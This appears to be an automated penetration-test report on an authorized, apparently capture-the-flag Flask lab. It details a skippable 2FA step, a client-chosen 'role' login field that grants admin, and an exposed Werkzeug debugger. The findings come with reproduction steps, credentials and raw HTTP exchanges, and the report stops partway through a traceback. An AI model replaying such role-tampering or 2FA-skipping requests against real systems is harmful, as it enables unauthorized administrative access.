# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — workflow-bypass 2FA enforcement bypass: admin dashboard reachable with pre-2FA session (OTP step never verified)](#finding-1)
    - [2. HIGH — mass-assignment Privilege role is mass-assigned from client-controlled 'role' form field (not bound to identity)](#finding-2)
    - [3. MEDIUM — misconfig Flask/Werkzeug debug mode enabled in production — source code, stack traces & debugger SECRET disclosed](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr1g1jwc-kowr1h` |
| Target | http://target.local:5003/ |
| Started | 2026-07-01T02:15:45.888Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 3 mapped · 2 scanned · 1 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:5003`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 2 high, 1 medium

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [workflow-bypass] 2FA enforcement bypass: admin dashboard reachable with pre-2FA session (OTP step never verified)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5003/

The admin portal advertises a two-step login: POST /login (password) then POST /admin/2fa (OTP) before reaching /admin/dashboard. In reality the second factor is never enforced. The password step (POST /login role=admin) issues a Flask session whose entire payload is {"role":"admin"} — it carries NO "2FA-completed" flag (base64 of the issued cookie decodes to {"role":"admin"}). /admin/dashboard authorizes purely on session['role']=='admin', so an actor who has only completed the password step — and never submitted any OTP — reaches the full admin dashboard. The 2FA page (/admin/2fa) is therefore decorative: skipping it entirely grants admin access. (The itsdangerous signature IS validated — a tampered-signature cookie is rejected with 302 — so the flaw is missing step-enforcement, not signature forgery.) Impact is compounded by weak, guessable admin credentials (admin/adminpassword) and by the /admin/2fa endpoint itself accepting the hardcoded OTP 1234 and even trusting a client-supplied "code" field.

**Reproduction**

```
1. POST /admin/login is GET-only; the login form posts to POST /login. Submit role=admin&username=admin&password=adminpassword (form-encoded). Response: {success:true, redirect:"/admin/2fa"} with Set-Cookie session=eyJyb2xlIjoiYWRtaW4ifQ.akR9Gw.StGpY5SIEkup7TCWqIC3EOA2phw (payload base64-decodes to {"role":"admin"}). Evidence ev-mr1gru7d-1p.
2. WITHOUT visiting or submitting /admin/2fa, GET /admin/dashboard with Cookie: session=<that cookie>. Response 200 "Welcome to the Admin Dashboard!" — full admin area. Positive replays ev-mr1gwc6p-20, ev-mr1gwcer-21.
3. Negative control: GET /admin/dashboard with the same cookie but a tampered signature → 302 redirect to /admin/login (access denied). Evidence ev-mr1gwbym-1z.
Conclusion: the mandatory 2FA step can be skipped entirely; a password-only session is fully authorized.
```

**Evidence**

- Evidence `ev-mr1gwbym-1z` — `artifacts/_/ev-mr1gwbym-1z/`

Request:

```http
GET /admin/dashboard HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 211
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 02:39:41 GMT
location: /admin/login
server: Werkzeug/3.0.3 Python/3.8.17

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/admin/login">/admin/login</a>. If not, click the link.
```

- Evidence `ev-mr1gwc6p-20` — `artifacts/_/ev-mr1gwc6p-20/`

Request:

```http
GET /admin/dashboard HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1463
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 02:39:41 GMT
server: Werkzeug/3.0.3 Python/3.8.17
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header text-center">
                        <h4>Admin Dashboard</h4>
                    </div>
                    <div class="card-body">
                        <p>Welcome to the Admin Dashboard!</p>
                        <p>This is a secure area for administrators only.</p>
                        <p>
                            If you are seeing this page, it means you are closer to get the flag. Dig deeper and maybe try to view <a href="/" flag="">me</a>.
                        </p>
                        <a href="/logout" class="btn btn-primary">Logout</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr1gwcer-21` — `artifacts/_/ev-mr1gwcer-21/`

Request:

```http
GET /admin/dashboard HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1463
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 02:39:42 GMT
server: Werkzeug/3.0.3 Python/3.8.17
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header text-center">
                        <h4>Admin Dashboard</h4>
                    </div>
                    <div class="card-body">
                        <p>Welcome to the Admin Dashboard!</p>
                        <p>This is a secure area for administrators only.</p>
                        <p>
                            If you are seeing this page, it means you are closer to get the flag. Dig deeper and maybe try to view <a href="/" flag="">me</a>.
                        </p>
                        <a href="/logout" class="btn btn-primary">Logout</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [mass-assignment] Privilege role is mass-assigned from client-controlled 'role' form field (not bound to identity)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5003/

POST /login validates the username+password pair (a wrong username `notauser` or wrong password is rejected) but then assigns session['role'] verbatim from the client-supplied `role` form field — it is NOT derived from the authenticated account. With one and the same valid credential (admin/adminpassword): role=admin yields a {"role":"admin"} session and routes into the admin branch (redirect /admin/2fa); role=employee yields a {"role":"employee"} session (redirect /emp/dashboard); and role=superadmin is accepted verbatim, producing a {"role":"superadmin"} session cookie (base64 eyJyb2xlIjoic3VwZXJhZG1pbiJ9, evidence ev-mr1h0yum-27) — a role that corresponds to no real account. Because privilege is taken from the request rather than the identity, ANY principal holding a valid (e.g. low-privileged employee) credential can self-assign role=admin at login. Chained with the 2FA-enforcement bypass (finding f-001, /admin/dashboard authorizes purely on session['role']=='admin' and never checks that OTP was completed), a client-chosen role=admin at /login grants a session that reaches the full admin dashboard without any second factor. The hidden `role` field on the public login form is thus a client-side privilege switch. (Demonstrated end-to-end with the admin account available in this environment; the identical mechanism grants admin to any other valid credential.)

**Reproduction**

```
1. Baseline / negative control: POST /login (form-encoded) role=employee&username=admin&password=adminpassword → {success:true, redirect:"/emp/dashboard"}, Set-Cookie session payload {"role":"employee"}. No admin branch. Evidence ev-mr1h2wxe-29.
2. Manipulation (×2 stable): POST /login role=admin&username=admin&password=adminpassword → {success:true, redirect:"/admin/2fa"}, Set-Cookie session payload {"role":"admin"}. The posted role drove the privilege branch. Evidence ev-mr1h2x5i-2a, ev-mr1h2xdm-2b.
3. Arbitrary role accepted: POST /login role=superadmin&username=admin&password=adminpassword → success, Set-Cookie session {"role":"superadmin"}. Evidence ev-mr1h0yum-27.
4. Controls proving credentials are still checked (so this is role-trust, not open auth): role=admin&username=notauser&password=adminpassword → invalid (ev-mr1h0xr7-26); role=employee&username=admin&password=wrongpass → invalid (ev-mr1h10d2-28).
Chain: POST /login role=admin (any valid credential) → {role:admin} session → GET /admin/dashboard (no 2FA) → 200 admin area (see f-001).
Remediation: derive the role server-side from the authenticated account; never accept a role/privilege field from the client.
```

**Evidence**

- Evidence `ev-mr1h2wxe-29` — `artifacts/_/ev-mr1h2wxe-29/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

role=employee&username=admin&password=adminpassword
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 71
content-type: application/json
date: Wed, 01 Jul 2026 02:44:48 GMT
server: Werkzeug/3.0.3 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

{
  "message": "",
  "redirect": "/emp/dashboard",
  "success": true
}
```

- Evidence `ev-mr1h2x5i-2a` — `artifacts/_/ev-mr1h2x5i-2a/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

role=admin&username=admin&password=adminpassword
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 67
content-type: application/json
date: Wed, 01 Jul 2026 02:44:49 GMT
server: Werkzeug/3.0.3 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

{
  "message": "",
  "redirect": "/admin/2fa",
  "success": true
}
```

- Evidence `ev-mr1h2xdm-2b` — `artifacts/_/ev-mr1h2xdm-2b/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

role=admin&username=admin&password=adminpassword
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 67
content-type: application/json
date: Wed, 01 Jul 2026 02:44:49 GMT
server: Werkzeug/3.0.3 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

{
  "message": "",
  "redirect": "/admin/2fa",
  "success": true
}
```

<a id="finding-3"></a>

### 3. [MEDIUM] [misconfig] Flask/Werkzeug debug mode enabled in production — source code, stack traces & debugger SECRET disclosed

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5003/

The application runs with Flask/Werkzeug debug mode enabled. Any request that triggers an unhandled exception (e.g. POST /login with a JSON body or with a missing form field, causing werkzeug.exceptions.BadRequestKeyError) returns the full interactive Werkzeug debugger page instead of a generic error. This page discloses: the application's source code with surrounding context lines, absolute server file paths (/usr/local/lib/python3.8/site-packages/flask/app.py and app frames), the Python/Flask versions, full tracebacks, and the debugger console secret token (SECRET = "***REDACTED***"). The interactive evaluator is disabled here (EVALEX=false), so no direct RCE console is available, but the source/path/traceback disclosure meaningfully aids further attacks and the SECRET would unlock the code-execution console if EVALEX were ever enabled. Debug mode must be disabled in any non-development deployment.

**Reproduction**

```
1. Negative control: GET /.env (or any normal missing path) returns a clean generic Flask 404 with no debugger/source. Evidence ev-mr1gxye8-22.
2. Positive: POST /login with Content-Type: application/json and body {"role":"employee",...} → 500 with the full Werkzeug debugger HTML: BadRequestKeyError traceback, flask app.py source, and inline `SECRET = "***REDACTED***"`. Evidence ev-mr1gk3wo-1g.
3. Positive replay: POST /login form-encoded omitting the role field (username=emp&password=emppassword) → same Werkzeug debugger page with source + SECRET. Evidence ev-mr1gk4u6-1h.
Remediation: set app.run(debug=False) / FLASK_DEBUG=0 and never expose the Werkzeug debugger publicly.
```

**Evidence**

- Evidence `ev-mr1gxye8-22` — `artifacts/_/ev-mr1gxye8-22/`

Request:

```http
GET /.env HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: close
content-length: 207
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 02:40:57 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mr1gk3wo-1g` — `artifacts/_/ev-mr1gk3wo-1g/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/json

{"role":"employee","username":"emp","password":"emppassword"}
```

Response:

```http
HTTP/1.1 500
connection: close
content-length: 15243
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 02:30:11 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!doctype html>
<html lang=en>
  <head>
    <title>werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;username&#39;
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = false,
          EVALEX_TRUSTED = false,
          SECRET = "***REDACTED***";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>BadRequestKeyError</h1>
<div class="detail">
  <p class="errormsg">werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;username&#39;
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-139045545832000">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1498</em>,
      in <code class="function">__call__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>) -&gt; cabc.Iterable[bytes]:</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)</pre></div>
</div>

<li><div class="frame" id="frame-139045545830320">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1476</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-139045545832112">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1473</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-139045545831664">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">882</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
</div>

<li><div class="frame" id="frame-139045546325600">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">880</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-139045546324256">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">865</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-139045546326720">
  <h4>File <cite class="filename">"/app/app.py"</cite>,
      line <em class="line">72</em>,
      in <code class="function">login</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span>@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])</pre>
<pre class="line before"><span class="ws"></span>def login():</pre>
<pre class="line before"><span class="ws">    </span>if request.method == &#39;POST&#39;:</pre>
<pre class="line before"><span class="ws">        </span>response = {&#39;success&#39;: False, &#39;message&#39;: &#39;&#39;, &#39;redirect&#39;: &#39;&#39;}</pre>
<pre class="line current"><span class="ws">        </span>username = request.form[&#39;username&#39;]</pre>
<pre class="line after"><span class="ws">        </span>password = request.form[&#39;password&#39;]</pre>
<pre class="line after"><span class="ws">        </span>role = request.form[&#39;role&#39;]</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span># sqli filter</pre>
<pre class="line after"><span class="ws">        </span>if not is_safe_input(username) or not is_safe_input(password) or not is_safe_input(role):</pre></div>
</div>

<li><div class="frame" id="frame-139045546324368">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py"</cite>,
      line <em class="line">196</em>,
      in <code class="function">__getitem__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>if key in self:</pre>
<pre class="line before"><span class="ws">            </span>lst = dict.__getitem__(self, key)</pre>
<pre class="line before"><span class="ws">            </span>if len(lst) &gt; 0:</pre>
<pre class="line before"><span class="ws">                </span>return lst[0]</pre>
<pre class="line current"><span class="ws">        </span>raise exceptions.BadRequestKeyError(key)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def __setitem__(self, key, value):</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Like :meth:`add` but removes an existing key first.</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span>:param key: the key for the value.</pre></div>
</div>
</ul>
  <blockquote>werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;username&#39;
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1476, in wsgi_app
    response = self.handle_exception(e)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File &#34;/app/app.py&#34;, line 72, in login
    username = request.form[&#39;username&#39;]
  File &#34;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&#34;, line 196, in __getitem__
    raise exceptions.BadRequestKeyError(key)
werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;username&#39;
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1476, in wsgi_app
    response = self.handle_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "/app/app.py", line 72, in login
    username = request.form['username']
  File "/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py", line 196, in __getitem__
    raise exceptions.BadRequestKeyError(key)
werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: 'username'


-->
```

- Evidence `ev-mr1gk4u6-1h` — `artifacts/_/ev-mr1gk4u6-1h/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

username=emp&password=emppassword
```

Response:

```http
HTTP/1.1 500
connection: close
content-length: 15264
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 02:30:12 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!doctype html>
<html lang=en>
  <head>
    <title>werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;role&#39;
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = false,
          EVALEX_TRUSTED = false,
          SECRET = "***REDACTED***";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>BadRequestKeyError</h1>
<div class="detail">
  <p class="errormsg">werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;role&#39;
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-139045546326272">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1498</em>,
      in <code class="function">__call__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>) -&gt; cabc.Iterable[bytes]:</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)</pre></div>
</div>

<li><div class="frame" id="frame-139045546324032">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1476</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-139045546325376">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1473</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-139045546325264">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">882</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
